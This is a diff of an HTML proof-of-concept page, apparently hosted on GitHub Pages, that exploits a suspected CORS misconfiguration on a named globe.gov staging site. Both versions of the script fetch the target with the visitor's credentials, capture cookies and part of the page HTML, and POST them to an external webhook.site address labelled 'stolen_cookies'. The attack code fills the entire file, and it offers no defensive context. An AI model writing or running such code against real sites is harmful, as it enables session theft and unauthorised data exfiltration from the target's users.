@@ -1,51 +1,58 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Simulating NASA CORS Exploit...</title>
   <meta charset="UTF-8">
+  <title>NASA CORS Session Leak PoC</title>
   <style>
-    body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
+    body {
+      background-color: black;
+      color: lime;
+      font-family: monospace;
+      padding: 20px;
+    }
   </style>
 </head>
 <body>
-  <h2>Simulating NASA CORS Exploit...</h2>
-  <div id="status">⏳ Please wait...</div>
+  <h2>🛰️ Simulating NASA CORS Exploit (with Credentials)...</h2>
+  <pre id="output">Loading...</pre>
 
   <script>
-    const target = "https://datasearchstaging.globe.gov/";
     const webhook = "https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de";
+    const target = "https://datasearchstaging.globe.gov";
 
-    async function exfiltrate() {
-      try {
-        // Fetch the target with credentials
-        const res = await fetch(target, {
-          method: "GET",
-          credentials: "include", // Send cookies
-          mode: "cors" // Trigger CORS misconfig
-        });
+    fetch(target, {
+      method: "GET",
+      credentials: "include",
+      mode: "cors"
+    })
+    .then(res => res.text())
+    .then(html => {
+      const cookies = document.cookie || "(Likely HttpOnly)";
+      const snippet = html.slice(0, 800);
+      const result = {
+        origin_used: "github-pages",
+        target: target,
+        stolen_cookies: cookies,
+        html_snippet: snippet,
+        timestamp: new Date().toISOString()
+      };
 
-        const html = await res.text();
-        const limitedHTML = html.slice(0, 1000);
+      // إظهار النتيجة في الصفحة
+      document.getElementById("output").textContent =
+        "🍪 Cookies:\n" + cookies + "\n\n🧩 HTML:\n" + snippet;
 
-        // Send cookies and HTML to Webhook
-        await fetch(webhook, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            origin_used: location.origin,
-            target: target,
-            stolen_cookies: document.cookie,
-            html_snippet: limitedHTML
-          })
-        });
-
-        document.getElementById("status").innerText = "✅ Exploit complete. Data sent.";
-      } catch (err) {
-        document.getElementById("status").innerText = "❌ Failed:\n" + err;
-      }
-    }
-
-    exfiltrate();
+      // إرسال إلى Webhook
+      fetch(webhook, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(result)
+      });
+    })
+    .catch(error => {
+      document.getElementById("output").textContent = "❌ Fetch error:\\n" + error;
+    });
   </script>
 </body>
 </html>
